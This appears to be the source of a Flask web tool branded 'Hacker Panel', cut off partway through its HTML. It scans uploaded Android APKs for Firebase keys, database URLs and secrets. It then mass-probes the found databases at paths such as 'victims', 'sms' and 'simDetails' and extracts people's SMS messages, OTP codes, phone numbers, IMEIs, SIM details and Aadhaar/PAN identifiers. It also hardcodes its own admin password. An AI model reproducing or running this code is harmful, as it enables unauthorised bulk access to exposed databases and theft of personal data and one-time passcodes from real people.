#!/usr/bin/env python3
"""
Hacker Panel — APK Firebase Scanner Pro
Admin-protected bulk APK scanner with deep Firebase extraction.
Admin path: /admin | Password: Tanmay1122@
"""

from flask import Flask, request, render_template_string, redirect, url_for, session, jsonify
import zipfile, re, io, json, time, threading, uuid
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests as _requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    # Persistent session with connection pooling — reuses TCP connections
    _SESSION = _requests.Session()
    _adapter = HTTPAdapter(
        pool_connections=64,
        pool_maxsize=128,
        max_retries=Retry(total=0),   # no retries — fail fast
    )
    _SESSION.mount('https://', _adapter)
    _SESSION.mount('http://',  _adapter)
    _SESSION.headers.update({'User-Agent': 'Mozilla/5.0'})
    def http_get(url, timeout=3):
        return _SESSION.get(url, timeout=timeout)
except ImportError:
    import urllib.request, urllib.error
    class _FakeResp:
        def __init__(self, status_code, text=''):
            self.status_code = status_code
            self.text = text
        def json(self): return json.loads(self.text)
    def http_get(url, timeout=3):
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            resp = urllib.request.urlopen(req, timeout=timeout)
            return _FakeResp(resp.getcode(), resp.read().decode('utf-8', errors='ignore'))
        except urllib.error.HTTPError as e:
            return _FakeResp(e.code)
        except:
            raise

app = Flask(__name__)
app.secret_key = 'HackerPanel_Medline_Secret_9x!@#'
app.config['MAX_CONTENT_LENGTH'] = 200 * 1024 * 1024  # 200MB

ADMIN_PASSWORD = 'Tanmay1122@'

# ─── In-memory results store ───────────────────────────────────────────────────
scan_results = {}   # {scan_id: {...}}
bulk_queue   = {}   # {job_id: {status, files, results, progress}}

# ─── Firebase probe paths ──────────────────────────────────────────────────────
FIREBASE_PROBE_PATHS = [
    # Root
    '',
    # Device / user paths
    'clients', 'All_Users', 'All_Users/simDetails', 'All_Users/Data/DeviceInfo',
    'users', 'user_data', 'UserData', 'userData', 'device', 'devices',
    'bots', 'Bots', 'panel', 'Panel',
    # SMS / messages
    'messages', 'Messages', 'sms', 'SMS', 'user_sms', 'inbox', 'Inbox',
    'sent', 'Sent', 'outbox', 'chat', 'chats',
    # Data buckets
    'data', 'Data', 'results', 'info', 'Info',
    'Ede', 'admin', 'Admin', 'logs', 'Logs', 'events', 'Events',
    # SIM-specific
    'sims', 'simInfo', 'sim_data', 'simDetails',
    # Common panel paths
    'registered', 'online', 'offline', 'active',
    'victims', 'targets', 'clients_data',
]

# ─── REGEX patterns ────────────────────────────────────────────────────────────
RE_API_KEY    = re.compile(r'AIza[a-zA-Z0-9_\-]{35}')
RE_APP_ID     = re.compile(r'1:[0-9]+:(?:android|ios|web):[a-f0-9]+')
RE_DB_URL     = re.compile(r'https://[a-z0-9\-]+\.(?:firebaseio\.com|firebasedatabase\.app)')
RE_SECRET     = re.compile(r'(?i)(?:password|passwd|pwd|secret|admin_pass|api_secret|token|auth_key)[\s]*[:=][\s]*["\']([^"\'\\s]{4,})["\']')
RE_PHONE      = re.compile(r'\+?(?:91|92|880|977|94|1)\d{9,12}|(?<!\d)(?:6|7|8|9)\d{9}(?!\d)')
RE_OTP        = re.compile(r'(?:OTP|otp|code|verify)[:\s#\-]*(\d{4,8})', re.I)
RE_IMEI       = re.compile(r'(?<!\d)\d{15}(?!\d)')
RE_EMAIL      = re.compile(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}')
RE_STORAGE    = re.compile(r'gs://[a-z0-9\-]+\.appspot\.com')
RE_PROJECT_ID = re.compile(r'[a-z][a-z0-9\-]{4,28}[a-z0-9](?=\.firebaseio|\.appspot|\.firebaseapp)')
RE_SIM_SERIAL = re.compile(r'89\d{17,19}')
RE_AADHAAR    = re.compile(r'(?<!\d)\d{4}\s?\d{4}\s?\d{4}(?!\d)')
RE_PAN        = re.compile(r'[A-Z]{5}\d{4}[A-Z]')

# ──────────────────────────────────────────────────────────────────────────────
# APK SCANNING ENGINE
# ──────────────────────────────────────────────────────────────────────────────

def scan_apk(apk_bytes, filename='unknown.apk'):
    findings = {
        'API Keys': set(), 'App IDs': set(), 'Database URLs': set(),
        'Storage Buckets': set(), 'Secrets': set(), 'Project IDs': set(),
        'Emails': set(), 'Phones': set(), 'SIM Serials': set(),
        'IMEI': set(), 'Aadhaar': set(), 'PAN': set(),
        'Files Scanned': 0, 'Total Files': 0,
    }

    SKIP_EXT = ('.png','.jpg','.jpeg','.gif','.mp3','.mp4',
                '.webp','.ogg','.ttf','.woff','.wav','.3gp',
                '.arsc','.dex','.so','.class')

    def _scan_file(fi_and_data):
        fi, raw = fi_and_data
        try:
            content = raw.decode('utf-8', errors='ignore')
            loc = {
                'API Keys':       set(RE_API_KEY.findall(content)),
                'App IDs':        set(RE_APP_ID.findall(content)),
                'Database URLs':  set(RE_DB_URL.findall(content)),
                'Storage Buckets':set(RE_STORAGE.findall(content)),
                'Project IDs':    set(RE_PROJECT_ID.findall(content)),
                'Emails':         set(RE_EMAIL.findall(content)),
                'Phones':         set(RE_PHONE.findall(content)),
                'SIM Serials':    set(RE_SIM_SERIAL.findall(content)),
                'IMEI':           set(RE_IMEI.findall(content)),
                'Aadhaar':        set(RE_AADHAAR.findall(content)),
                'PAN':            set(RE_PAN.findall(content)),
                'Secrets':        set(),
            }
            for m in RE_SECRET.finditer(content):
                val = m.group(1)
                if len(val) > 3 and val not in ('true','false','null','undefined'):
                    loc['Secrets'].add(val)
            return loc
        except Exception:
            return None

    try:
        with zipfile.ZipFile(io.BytesIO(apk_bytes), 'r') as z:
            all_files = z.infolist()
            findings['Total Files'] = len(all_files)
            # Read files that are worth scanning
            tasks = []
            for fi in all_files:
                fn = fi.filename.lower()
                if any(fn.endswith(ext) for ext in SKIP_EXT):
                    continue
                try:
                    raw = z.read(fi)
                    tasks.append((fi, raw))
                except Exception:
                    continue
            findings['Files Scanned'] = len(tasks)

            # Scan all files in parallel using threads
            with ThreadPoolExecutor(max_workers=min(32, len(tasks) or 1)) as pool:
                for result in pool.map(_scan_file, tasks):
                    if result is None:
                        continue
                    for key in ('API Keys','App IDs','Database URLs','Storage Buckets',
                                'Project IDs','Emails','Phones','SIM Serials','IMEI',
                                'Aadhaar','PAN','Secrets'):
                        findings[key].update(result[key])

    except zipfile.BadZipFile:
        return None, None, f'Not a valid APK/ZIP (received {len(apk_bytes):,} bytes)'
    except Exception as e:
        return None, None, f'Parse error: {e}'

    # Convert sets to sorted lists
    out = {k: sorted(list(v)) if isinstance(v, set) else v for k, v in findings.items()}

    # Deep Firebase probe — run in parallel with zip scan already done
    db_checks = {}
    if out['Database URLs']:
        db_checks = probe_all_firebase(out['Database URLs'])

    return out, db_checks, None


# ──────────────────────────────────────────────────────────────────────────────
# FIREBASE DEEP PROBE
# ──────────────────────────────────────────────────────────────────────────────

def probe_single_path(base_url, path, auth=''):
    # Use ?shallow=true so Firebase only returns top-level keys (much faster)
    qs = '?shallow=true'
    if auth and auth.lower() not in ('', 'public', 'none'):
        qs += f'&auth={auth}'
    url = (f"{base_url}/{path}.json" if path else f"{base_url}/.json") + qs
    try:
        resp = http_get(url, timeout=3)
        if resp.status_code == 200:
            try:
                data = resp.json()
                if data is None:
                    return None
                return data
            except Exception:
                return None
        return None
    except Exception:
        return None


def extract_devices_from_data(data, source_url='', path=''):
    """Recursively pull device records, SIM info, SMS from Firebase JSON."""
    devices, sms_list, phones = [], [], []

    def _walk(obj, p=''):
        if isinstance(obj, dict):
            keys = {k.lower() for k in obj}
            # SMS-like record
            if any(k in keys for k in ['body','message','msg','text','sms']):
                body = obj.get('body') or obj.get('message') or obj.get('msg') or obj.get('text') or ''
                sender = obj.get('address') or obj.get('sender') or obj.get('number') or obj.get('from') or 'Unknown'
                ts = obj.get('date') or obj.get('timestamp') or obj.get('time') or 0
                otp = None
                m = RE_OTP.search(str(body))
                if m: otp = m.group(1)
                if body and str(body).strip():
                    sms_list.append({
                        'body': str(body)[:500], 'sender': str(sender),
                        'timestamp': str(ts), 'otp': otp, 'source': source_url, 'path': p
                    })
            # Device-like record
            if any(k in keys for k in ['mobno','mobile','phonenumber','phone','imei','deviceid','androidid','model']):
                phone = (obj.get('mobNo') or obj.get('mobile') or obj.get('phoneNumber') or
                         obj.get('phone') or obj.get('number') or obj.get('mobno') or '')
                imei  = obj.get('imei') or obj.get('IMEI') or ''
                model = obj.get('model') or obj.get('Model') or obj.get('deviceModel') or obj.get('brand') or ''
                name  = obj.get('name') or obj.get('Name') or ''
                status = bool(obj.get('status') or obj.get('online') or obj.get('isOnline') or False)
                # SIM details
                sims = obj.get('sims') or obj.get('simDetails') or obj.get('simInfo') or {}
                sim_phones = []
                if isinstance(sims, list):
                    sim_phones = [s.get('phoneNumber','') for s in sims if isinstance(s, dict)]
                elif isinstance(sims, dict):
                    sim_phones = [v.get('phoneNumber','') for v in sims.values() if isinstance(v, dict)]
                if not phone and sim_phones:
                    phone = sim_phones[0]
                battery = obj.get('battery') or obj.get('batteryLevel') or ''
                try: battery = int(str(battery).replace('%',''))
                except: battery = None
                if phone or imei or model:
                    devices.append({
                        'phone': str(phone), 'imei': str(imei), 'model': str(model),
                        'name': str(name), 'status': status, 'battery': battery,
                        'sim_numbers': [s for s in sim_phones if s],
                        'source': source_url, 'path': p
                    })
            # Phone number mentions anywhere
            for v in obj.values():
                if isinstance(v, str):
                    found = RE_PHONE.findall(v)
                    phones.extend(found)
            for k, v in obj.items():
                _walk(v, f'{p}.{k}')
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                _walk(item, f'{p}[{i}]')

    _walk(data, path)
    return devices, sms_list, list(set(phones))


def probe_firebase_url(base_url, auth=''):
    """Probe one Firebase URL across all known paths. Returns rich result dict."""
    base_url = base_url.rstrip('/').rstrip('.json')
    result = {
        'url': base_url,
        'endpoints': [],
        'devices': [],
        'sms': [],
        'phones': [],
        'vulnerable': False,
        'total_records': 0,
    }

    with ThreadPoolExecutor(max_workers=50) as ex:  # 50 concurrent path probes
        futures = {ex.submit(probe_single_path, base_url, p, auth): p for p in FIREBASE_PROBE_PATHS}
        for fut in as_completed(futures):
            path = futures[fut]
            try:
                data = fut.result()
                if data is None:
                    continue
                result['vulnerable'] = True
                count = len(data) if isinstance(data, (dict, list)) else 1
                result['total_records'] += count
                result['endpoints'].append({
                    'path': path or '/',
                    'count': count,
                    'url': f"{base_url}/{path}.json" if path else f"{base_url}/.json",
                })
                devs, smses, phones = extract_devices_from_data(data, base_url, path)
                result['devices'].extend(devs)
                result['sms'].extend(smses)
                result['phones'].extend(phones)
            except Exception:
                continue

    result['phones'] = list(set(result['phones']))
    # Deduplicate devices by phone+imei
    seen = set()
    deduped = []
    for d in result['devices']:
        k = (d['phone'], d['imei'])
        if k not in seen:
            seen.add(k)
            deduped.append(d)
    result['devices'] = deduped

    return result


def probe_all_firebase(db_urls, auth=''):
    results = {}
    with ThreadPoolExecutor(max_workers=20) as ex:  # 20 concurrent URLs
        futures = {ex.submit(probe_firebase_url, url, auth): url for url in db_urls}
        for fut in as_completed(futures):
            url = futures[fut]
            try:
                results[url] = fut.result()
            except Exception as e:
                results[url] = {'url': url, 'error': str(e), 'vulnerable': False,
                                'endpoints': [], 'devices': [], 'sms': [], 'phones': []}
    return results


# ──────────────────────────────────────────────────────────────────────────────
# HTML TEMPLATE
# ──────────────────────────────────────────────────────────────────────────────

LOGIN_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Admin Login — Hacker Panel</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=JetBrains+Mono:wght@400;600&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet"/>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#050709;min-height:100vh;display:flex;align-items:center;justify-content:center;
  font-family:'Rajdhani',sans-serif;color:#c8e8f0;
  background-image:radial-gradient(ellipse at 25% 20%,rgba(0,229,255,.06),transparent 55%),radial-gradient(ellipse at 80% 80%,rgba(255,34,68,.04),transparent 50%);}
body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 1px,rgba(0,229,255,.01) 1px,rgba(0,229,255,.01) 3px);pointer-events:none;}
.card{background:linear-gradient(160deg,rgba(12,17,24,.98),rgba(8,12,16,.98));border:1px solid rgba(0,229,255,.18);border-radius:20px;padding:40px;width:100%;max-width:420px;position:relative;overflow:hidden;
  box-shadow:0 0 0 1px rgba(0,229,255,.04),0 60px 120px rgba(0,0,0,.85),inset 0 1px 0 rgba(0,229,255,.06);}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,#ff2244,#00e5ff,#ff2244,#33ecff);background-size:400%;animation:flow 3s ease infinite;border-radius:20px 20px 0 0;}
@keyframes flow{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
@keyframes flick{0%,100%{transform:scaleY(1);filter:hue-rotate(0)}25%{transform:scaleY(1.08) scaleX(.95);filter:hue-rotate(-15deg)}75%{transform:scaleY(.94) scaleX(1.05);filter:hue-rotate(10deg)}}
.fire{font-size:72px;text-align:center;margin-bottom:12px;animation:flick 1.8s ease-in-out infinite;filter:drop-shadow(0 0 24px rgba(255,120,0,.75));}
h1{font-family:'Orbitron',monospace;font-size:28px;text-align:center;margin-bottom:4px;background:linear-gradient(90deg,#00e5ff,#33ecff,#ff2244);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
.sub{text-align:center;font-size:12px;color:#2d5a6e;margin-bottom:28px;}
label{display:block;font-size:10px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:#2d5a6e;margin-bottom:6px;}
input{width:100%;padding:13px 16px;background:rgba(16,24,34,.8);border:1px solid rgba(0,229,255,.12);border-radius:10px;color:#c8e8f0;font-family:'JetBrains Mono',monospace;font-size:13px;outline:none;margin-bottom:16px;transition:border-color .2s,box-shadow .2s;}
input:focus{border-color:#00e5ff;box-shadow:0 0 0 3px rgba(0,229,255,.1);}
input::placeholder{color:#1a3040;}
button{width:100%;padding:15px;border:none;border-radius:12px;color:#020810;font-family:'Orbitron',monospace;font-size:14px;font-weight:700;cursor:pointer;background:linear-gradient(135deg,#33ecff,#00e5ff,#0099cc);box-shadow:0 6px 32px rgba(0,229,255,.35);transition:all .2s;letter-spacing:1px;}
button:hover{transform:translateY(-3px);box-shadow:0 14px 44px rgba(0,229,255,.5);}
.err{color:#ff4466;font-size:12px;text-align:center;padding:9px;background:rgba(255,34,68,.08);border:1px solid rgba(255,34,68,.2);border-radius:8px;margin-top:8px;}
.lock{font-size:11px;text-align:center;margin-top:18px;letter-spacing:2px;text-transform:uppercase;color:#1a3040;}
</style>
</head>
<body>
<div class="card">
  <div class="fire">🔥</div>
  <h1>Admin Access</h1>
  <div class="sub">Hacker Panel — Restricted Zone</div>
  <form method="POST">
    <label>Admin Password</label>
    <input type="password" name="password" placeholder="Enter admin password" autofocus/>
    {% if error %}<div class="err">{{ error }}</div>{% endif %}
    <button type="submit" style="margin-top:10px;">🔓 UNLOCK</button>
  </form>
  <div class="lock">🔒 Authorized Personnel Only</div>
</div>
</body>
</html>"""


SCANNER_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>APK Firebase Scanner Pro — Hacker Panel</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=JetBrains+Mono:wght@300;400;600&family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet"/>
<style>
:root{
  --bg:#050709;--bg2:#080c10;--bg3:#0c1118;--bg4:#101820;
  --cyan:#00e5ff;--cyan2:#33ecff;--red:#ff2244;--red2:#ff4466;
  --mint:#00d4aa;--amber:#ff9900;--sky:#38bdf8;--lilac:#c084fc;
  --text:#c8e8f0;--sub:#2d5a6e;--dim:#1a3040;
  --border:rgba(0,229,255,.08);--border2:rgba(0,229,255,.22);
  --rborder:rgba(255,34,68,.15);--rborder2:rgba(255,34,68,.35);
  --cyan-dim:rgba(0,229,255,.1);--red-dim:rgba(255,34,68,.08);
}
*{margin:0;padding:0;box-sizing:border-box;}
html{scroll-behavior:smooth;}
body{background:var(--bg);color:var(--text);font-family:'Rajdhani',sans-serif;min-height:100vh;
  background-image:radial-gradient(ellipse at 20% 10%,rgba(0,229,255,.05),transparent 50%),radial-gradient(ellipse at 80% 90%,rgba(255,34,68,.03),transparent 50%);}
body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 1px,rgba(0,229,255,.01) 1px,rgba(0,229,255,.01) 3px);pointer-events:none;z-index:0;}
::-webkit-scrollbar{width:4px;height:4px;}::-webkit-scrollbar-thumb{background:#1a3040;border-radius:4px;}
/* TOPBAR */
.tb{background:rgba(8,12,16,.98);border-bottom:1px solid var(--border);padding:0 24px;height:52px;display:flex;align-items:center;gap:12px;position:sticky;top:0;z-index:100;}
.tb::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--red),var(--cyan),var(--red),transparent);}
.tb-logo{font-family:'Orbitron',monospace;font-size:15px;font-weight:700;}
.tb-c{background:linear-gradient(90deg,var(--cyan),var(--cyan2),var(--red2),var(--cyan));background-size:300%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:shimmer 4s linear infinite;}
@keyframes shimmer{0%{background-position:-400% center}100%{background-position:400% center}}
@keyframes flick{0%,100%{transform:scaleY(1)}25%{transform:scaleY(1.1) scaleX(.94)}75%{transform:scaleY(.93) scaleX(1.06)}}
@keyframes spin{to{transform:rotate(360deg)}}
@keyframes fadeUp{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:translateY(0)}}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
@keyframes flow{0%{background-position:0 50%}50%{background-position:100% 50%}100%{background-position:0 50%}}
@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
.fire-sm{font-size:20px;animation:flick 2s ease-in-out infinite;filter:drop-shadow(0 0 8px rgba(255,120,0,.6));}
.pill{font-size:9px;font-weight:700;padding:3px 9px;border-radius:20px;letter-spacing:.5px;}
.p-admin{background:rgba(255,34,68,.1);color:var(--red2);}
.logout{margin-left:auto;padding:6px 14px;background:var(--bg3);border:1px solid var(--border);border-radius:8px;color:var(--sub);font-size:10px;font-weight:700;cursor:pointer;letter-spacing:.5px;transition:all .15s;text-decoration:none;font-family:'Rajdhani',sans-serif;}
.logout:hover{color:var(--red2);border-color:var(--rborder2);}
/* MAIN */
.wrap{max-width:1200px;margin:0 auto;padding:28px 20px;position:relative;z-index:1;}
/* HERO */
.hero{text-align:center;margin-bottom:36px;animation:fadeUp .5s ease;}
.hero-fire{font-size:72px;animation:flick 1.8s ease-in-out infinite;filter:drop-shadow(0 0 24px rgba(255,120,0,.7));margin-bottom:12px;}
.hero-h{font-family:'Orbitron',monospace;font-size:36px;font-weight:900;margin-bottom:6px;}
.hero-sub{font-size:14px;color:var(--sub);max-width:520px;margin:0 auto;line-height:1.7;}
/* UPLOAD CARDS */
.upload-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:28px;}
@media(max-width:700px){.upload-grid{grid-template-columns:1fr;}}
.ucard{background:linear-gradient(145deg,var(--bg3),var(--bg2));border:1px solid var(--border2);border-radius:20px;padding:24px;position:relative;overflow:hidden;animation:fadeUp .4s ease;}
.ucard::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background-size:300%;animation:shimmer 3s linear infinite;border-radius:20px 20px 0 0;}
.uc-single::before{background:linear-gradient(90deg,var(--cyan),var(--cyan2),var(--red2),var(--cyan));}
.uc-bulk::before{background:linear-gradient(90deg,var(--red),var(--amber),var(--red2),var(--red));}
.ucard-h{font-size:16px;font-weight:700;font-family:'Orbitron',monospace;margin-bottom:4px;}
.ucard-s{font-size:12px;color:var(--sub);margin-bottom:16px;}
.drop-z{border:2px dashed rgba(0,229,255,.2);border-radius:14px;padding:32px 16px;text-align:center;cursor:pointer;transition:all .2s;position:relative;background:rgba(0,229,255,.02);}
.drop-z:hover,.drop-z.dg{border-color:var(--cyan);background:rgba(0,229,255,.05);transform:scale(1.01);}
.drop-z.red-z{border-color:rgba(255,34,68,.25);background:rgba(255,34,68,.02);}
.drop-z.red-z:hover,.drop-z.red-z.dg{border-color:var(--red);background:rgba(255,34,68,.06);}
.dz-ico{font-size:44px;margin-bottom:8px;animation:float 4s ease-in-out infinite;}
.dz-t{font-size:15px;font-weight:700;font-family:'Orbitron',monospace;margin-bottom:4px;}
.dz-s{font-size:11px;color:var(--sub);}
.file-tags{display:flex;gap:4px;flex-wrap:wrap;justify-content:center;margin-top:8px;}
.ftag{font-size:8px;font-weight:700;padding:2px 7px;border-radius:10px;}
.ft-r{background:rgba(255,34,68,.1);color:var(--red2);border:1px solid rgba(255,34,68,.2);}
.ft-c{background:rgba(0,229,255,.07);color:var(--cyan2);border:1px solid var(--border);}
.ft-a{background:rgba(255,153,0,.1);color:var(--amber);border:1px solid rgba(255,153,0,.2);}
input[type=file]{position:absolute;inset:0;opacity:0;cursor:pointer;}
/* Queue */
.queue-box{margin-top:14px;display:none;}
.q-header{font-size:10px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--sub);margin-bottom:8px;}
.q-list{display:flex;flex-direction:column;gap:5px;max-height:200px;overflow-y:auto;}
.q-item{display:flex;align-items:center;gap:8px;background:var(--bg4);border:1px solid var(--border);border-radius:8px;padding:8px 11px;font-size:10px;}
.q-name{flex:1;font-family:'JetBrains Mono',monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
.q-sz{color:var(--sub);flex-shrink:0;}
.q-st{flex-shrink:0;font-weight:700;font-size:9px;}
.q-rm{cursor:pointer;color:var(--dim);padding:1px 5px;background:var(--red-dim);border:1px solid var(--rborder);border-radius:3px;transition:color .15s;}
.q-rm:hover{color:var(--red);}
/* Buttons */
.btn-primary{width:100%;padding:14px;border:none;border-radius:11px;color:#020810;font-family:'Orbitron',monospace;font-size:13px;font-weight:700;cursor:pointer;background:linear-gradient(135deg,var(--cyan2),var(--cyan),#0099cc);box-shadow:0 4px 26px rgba(0,229,255,.3);transition:all .18s;letter-spacing:.8px;margin-top:12px;}
.btn-primary:hover{transform:translateY(-2px);box-shadow:0 10px 34px rgba(0,229,255,.45);}
.btn-red{width:100%;padding:14px;border:none;border-radius:11px;color:#fff;font-family:'Orbitron',monospace;font-size:13px;font-weight:700;cursor:pointer;background:linear-gradient(135deg,var(--red),#cc0022);box-shadow:0 4px 26px rgba(255,34,68,.3);transition:all .18s;letter-spacing:.8px;margin-top:12px;}
.btn-red:hover{transform:translateY(-2px);box-shadow:0 14px 40px rgba(255,34,68,.5);}
.btn-sm{padding:7px 14px;border-radius:8px;font-family:'Rajdhani',sans-serif;font-size:11px;font-weight:700;cursor:pointer;border:1px solid;transition:all .15s;letter-spacing:.5px;}
.bs-c{background:var(--cyan-dim);border-color:var(--border2);color:var(--cyan2);}
.bs-r{background:var(--red-dim);border-color:var(--rborder);color:var(--red2);}
/* Global progress */
.gprog{display:none;background:var(--bg2);border:1px solid var(--border);border-radius:11px;padding:16px;margin-top:14px;}
.gprog-head{display:flex;justify-content:space-between;margin-bottom:8px;}
.gprog-label{font-size:11px;font-weight:700;}
.gprog-count{font-size:11px;color:var(--sub);}
.pbar{height:5px;background:var(--bg3);border-radius:5px;overflow:hidden;}
.pbar-fill{height:100%;background:linear-gradient(90deg,var(--red),var(--cyan));border-radius:5px;transition:width .4s ease;width:0%;}
.gprog-file{font-size:10px;color:var(--sub);margin-top:6px;}
/* Section headers */
.sec-hdr{font-size:9px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--sub);margin-bottom:14px;display:flex;align-items:center;gap:9px;}
.sec-hdr::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,var(--border2),transparent);}
/* Results area */
.results{animation:fadeUp .4s ease;}
/* Firebase probe results */
.fb-result-card{background:linear-gradient(145deg,var(--bg3),var(--bg2));border:1px solid var(--border2);border-radius:16px;padding:20px;margin-bottom:14px;position:relative;overflow:hidden;}
.fb-result-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--red),var(--cyan),var(--amber),var(--cyan));background-size:300%;animation:shimmer 3s linear infinite;border-radius:16px 16px 0 0;}
.fb-url{font-size:11px;font-family:'JetBrains Mono',monospace;color:var(--cyan);margin-bottom:12px;word-break:break-all;}
.vuln-badge{display:inline-flex;align-items:center;gap:6px;font-size:10px;font-weight:700;padding:3px 10px;border-radius:20px;margin-bottom:12px;}
.vb-open{background:rgba(255,34,68,.1);color:var(--red2);border:1px solid var(--rborder2);}
.vb-secure{background:rgba(0,212,170,.08);color:var(--mint);border:1px solid rgba(0,212,170,.2);}
/* Device table */
.dev-table{width:100%;border-collapse:collapse;font-size:11px;}
.dev-table th{padding:8px 12px;font-size:8px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--sub);text-align:left;background:var(--bg3);border-bottom:1px solid var(--border);}
.dev-table td{padding:10px 12px;border-top:1px solid rgba(0,229,255,.03);}
.dev-table tbody tr:hover{background:rgba(0,229,255,.03);}
.tbl-wrap{background:var(--bg2);border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:12px;}
/* SMS bubbles */
.sms-bub{background:var(--bg2);border:1px solid var(--border);border-left:3px solid var(--sky);border-radius:10px;padding:11px 14px;margin-bottom:7px;transition:border-color .15s;}
.sms-bub.has-otp{border-left-color:var(--red);}
.sms-meta{display:flex;gap:8px;margin-bottom:6px;flex-wrap:wrap;align-items:center;}
.sms-from{font-size:11px;font-weight:700;font-family:'JetBrains Mono',monospace;}
.otp-hl{background:var(--red-dim);color:var(--red2);border:1px solid var(--rborder);border-radius:4px;padding:1px 6px;font-weight:700;font-family:'JetBrains Mono',monospace;font-size:10px;cursor:pointer;}
.sms-body{font-size:12px;color:#88b8c8;line-height:1.6;word-break:break-word;}
/* Findings grid */
.findings-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:20px;}
@media(max-width:900px){.findings-grid{grid-template-columns:repeat(2,1fr);}}
@media(max-width:500px){.findings-grid{grid-template-columns:1fr;}}
.fc{background:linear-gradient(145deg,var(--bg3),var(--bg2));border:1px solid var(--border);border-radius:14px;padding:18px;}
.fc-t{font-size:11px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--sub);margin-bottom:10px;display:flex;align-items:center;gap:6px;}
.cnt-badge{background:var(--cyan-dim);color:var(--cyan2);font-size:9px;padding:1px 6px;border-radius:8px;}
.fc-r .fc-t{color:var(--red2);}
.cnt-badge-r{background:var(--red-dim);color:var(--red2);font-size:9px;padding:1px 6px;border-radius:8px;}
.tag{display:inline-block;background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:3px 8px;margin:2px;font-size:9px;font-family:'JetBrains Mono',monospace;cursor:pointer;transition:all .12s;word-break:break-all;}
.tag:hover{border-color:var(--border2);color:var(--cyan);}
.tag.t-r{border-color:rgba(255,34,68,.2);color:var(--red2);}
.tag.t-g{border-color:rgba(0,212,170,.2);color:var(--mint);}
.tag.t-a{border-color:rgba(255,153,0,.2);color:var(--amber);}
.empty-state{text-align:center;padding:30px;color:var(--dim);font-size:12px;}
/* Status badges */
.badge{font-size:8px;font-weight:700;padding:2px 7px;border-radius:10px;}
.b-on{background:rgba(0,212,170,.1);color:var(--mint);}
.b-off{background:var(--red-dim);color:var(--red2);}
/* Stats bar */
.stats-bar{display:grid;grid-template-columns:repeat(6,1fr);gap:10px;margin-bottom:22px;}
@media(max-width:700px){.stats-bar{grid-template-columns:repeat(3,1fr);}}
.stat-c{background:linear-gradient(145deg,var(--bg3),var(--bg2));border:1px solid var(--border);border-radius:12px;padding:14px;text-align:center;transition:transform .2s;}
.stat-c:hover{transform:translateY(-3px);}
.stat-n{font-size:32px;font-weight:800;font-family:'Orbitron',monospace;line-height:1;margin-bottom:3px;}
.stat-l{font-size:8px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--sub);}
/* Toast */
.toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(20px);background:linear-gradient(135deg,var(--bg4),var(--bg3));border:1px solid var(--border2);color:var(--text);font-size:12px;font-weight:700;padding:10px 22px;border-radius:20px;z-index:999;opacity:0;transition:all .3s;pointer-events:none;white-space:nowrap;font-family:'Rajdhani',sans-serif;}
.toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
/* Spinner */
.spin{width:18px;height:18px;border-radius:50%;border:2px solid transparent;border-top-color:var(--cyan);border-right-color:var(--red);animation:spin .7s linear infinite;display:inline-block;}
</style>
</head>
<body>

<div class="tb">
  <div class="fire-sm">🔥</div>
  <div class="tb-logo"><span class="tb-c">Hacker</span> Panel</div>
  <span class="pill p-admin">🔒 Admin</span>
  <a href="/admin/logout" class="logout">Logout</a>
</div>

<div class="wrap">
  <div class="hero">
    <div class="hero-fire">🔥</div>
    <div class="hero-h"><span style="background:linear-gradient(90deg,#00e5ff,#33ecff,#ff2244);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">APK</span> Firebase Scanner Pro</div>
    <div class="hero-sub">Upload APKs to extract Firebase URLs, API keys, secrets — then auto-probe each database for devices, SIM numbers, SMS messages, and online status.</div>
  </div>

  <!-- UPLOAD SECTION -->
  <div class="upload-grid">
    <!-- Single APK -->
    <div class="ucard uc-single">
      <div class="ucard-h">⚡ Single APK Scan</div>
      <div class="ucard-s">Upload one APK — instant deep scan + Firebase probe</div>
      <form id="singleForm" enctype="multipart/form-data">
